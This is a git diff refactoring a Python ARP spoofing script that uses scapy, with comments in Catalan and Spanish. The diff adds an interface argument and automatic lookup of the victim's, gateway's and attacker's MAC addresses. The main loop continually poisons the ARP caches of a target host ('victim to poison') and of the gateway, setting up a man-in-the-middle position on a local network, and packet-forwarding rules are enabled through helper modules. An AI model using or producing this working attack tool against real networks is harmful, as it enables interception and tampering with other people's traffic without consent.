@@ -7,17 +7,11 @@ import argparse
 import subprocess
 import scapy.all as scapy
 from colorama import Fore
-from myUtils import show_message
-from argparse import RawDescriptionHelpFormatter
-from myUtils import show_message
+from modules.my_utils import show_message
+from modules.sys_utils import enable_rules, disable_rules
+from modules.net_utils import get_gateway, get_own_mac, get_mac
 
-### Variables & Constants #################################################################################################
-
-SRC_IP = ""
-SRC_MAC = "aa:bb:cc:11:22:33"
-DST_MAC = "d4:d8:53:23:57:cb"
-
-### Functions #############################################################################################################
+### Functions #######################################################################################################################
 
 def def_handler(sig, frame):
     show_message("Exiting the program...", "error")
@@ -25,72 +19,37 @@ def def_handler(sig, frame):
     sys.exit(1)
 
 def get_arguments():
-    
-    parser = argparse.ArgumentParser(description = (f"""{Fore.WHITE}ARP Spoofer
-
-    {Fore.RED}[!] {Fore.YELLOW}Important
-
-    {Fore.YELLOW}[+] {Fore.MAGENTA}Initialization: {Fore.CYAN}To run this script, you must execute:
-        {Fore.GREEN}sudo ./nftables.sh
-
-    {Fore.YELLOW}[-] {Fore.MAGENTA}Reset: {Fore.CYAN}To restore normal network settings:
-        {Fore.GREEN}sudo nft flush ruleset{Fore.RESET}"""),
-    formatter_class=RawDescriptionHelpFormatter)
-
-    parser.add_argument("-t", "--target", required=True, dest="target", help="Host o rango de red a escanear")
-
+    parser = argparse.ArgumentParser(description="ARP Spoofer")
+    parser.add_argument("-t", "--target", required=True, dest="target", help="Victima o victimas para envenenar")
+    parser.add_argument("-i", "--interface", required=True, dest="interface", help="Interfaz de red a envenenar")
     return parser.parse_args()
 
-def spoof(ip_address, spoof_ip):
-    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc=SRC_MAC)
-    ether_packet = scapy.Ether(dst=DST_MAC) / arp_packet
+def spoof(ip_address, spoof_ip, my_mac, victim_mac):
+    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc=my_mac)
+    ether_packet = scapy.Ether(dst=victim_mac) / arp_packet  # Definir correctament la trama Ethernet
     scapy.sendp(ether_packet, verbose=False)
 
-def command_execute(command):
-    try:
-        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+### Main Code #######################################################################################################################
 
-    except:
-        pass
-
-def disable_rules():
-    # Borra les regles de nftables
-    command_execute("nft flush ruleset")
-    
-    # Deshabilita l'encaminament
-    # Si el vols tenir activat sempre comenta les linies que fan referencia a l'encaminament
-    command_execute("sysctl -w net.ipv4.ip_forward=0")
-
-def get_gateway():
-    result = subprocess.run("ip route show default", shell=True, capture_output=True, text=True)
-    return result.stdout.split()[2]    
-
-def init():
-    # Permet el tallar el programa amb Ctrl + C
-    signal.signal(signal.SIGINT, def_handler)
-    show_message("Iniciando el programa:", "info", "Arp Spoof")
-    
 def main():
-    
     try:
-        if not SRC_MAC or not DST_MAC:
-            show_message("Please, add the source MAC ")
-
-
-        else:    
-            init()
-            arguments = get_arguments()
-            SRC_IP = get_gateway()
-            print(SRC_IP)
-
-            # Per sortir del bucle es surt amb Ctrl + C
-            while True: 
-                spoof(arguments.target, SRC_IP)
-                spoof(SRC_IP, arguments.target)
+        signal.signal(signal.SIGINT, def_handler)
+        show_message("Executing:", "info", "Arp Spoof")
+        arguments = get_arguments()
         
+        enable_rules()
+
+        router_ip = get_gateway()
+        my_mac = get_own_mac(arguments.interface)  # Passar la interfície correctament
+        victim_mac = get_mac(arguments.target)
+
+        while True:
+            spoof(arguments.target, router_ip, my_mac, victim_mac)
+            spoof(router_ip, arguments.target, my_mac, victim_mac)
+
     except PermissionError:
-         print(f"{Fore.RED}[!] {Fore.YELLOW}You need to be SuperUser to perform this script")
-         sys.exit(1)
+        show_message("You need to be SuperUser to perform this script", "error")
+        sys.exit(1)
 
 if __name__ == "__main__":
     main()
